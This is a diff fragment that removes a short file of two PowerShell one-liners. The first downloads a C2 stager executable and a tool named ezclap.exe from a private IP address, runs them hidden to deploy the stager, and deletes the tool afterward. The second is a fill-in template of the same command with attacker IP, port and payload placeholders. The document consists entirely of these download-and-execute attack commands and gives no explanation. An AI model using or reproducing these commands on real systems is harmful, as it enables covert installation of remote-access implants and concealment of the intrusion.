@@ -1,4 +1,0 @@
-powershell.exe -Sta -Nop -Window Hidden -c (New-Object System.Net.WebClient).DownloadFile("http://192.168.204.151:8080/GruntStager.exe", "C:\GruntStager.exe");(New-Object System.Net.WebClient).DownloadFile("http://192.168.204.151:8080/ezclap.exe", "C:\ezclap.exe");C:\ezclap.exe -t all -b C:\GruntStager.exe;Remove-Item -Path C:\ezclap.exe -Force
-
-
-powershell.exe -Sta -Nop -Window Hidden -c (New-Object System.Net.WebClient).DownloadFile("http://<attackerIP>:<PORT>/<payload.exe>", "C:\<payload.exe>");(New-Object System.Net.WebClient).DownloadFile("http://<attackerIP>:<PORT>/ezclap.exe", "C:\ezclap.exe");C:\ezclap.exe -t all -b C:\GruntStager.exe;Remove-Item -Path C:\ezclap.exe -Force
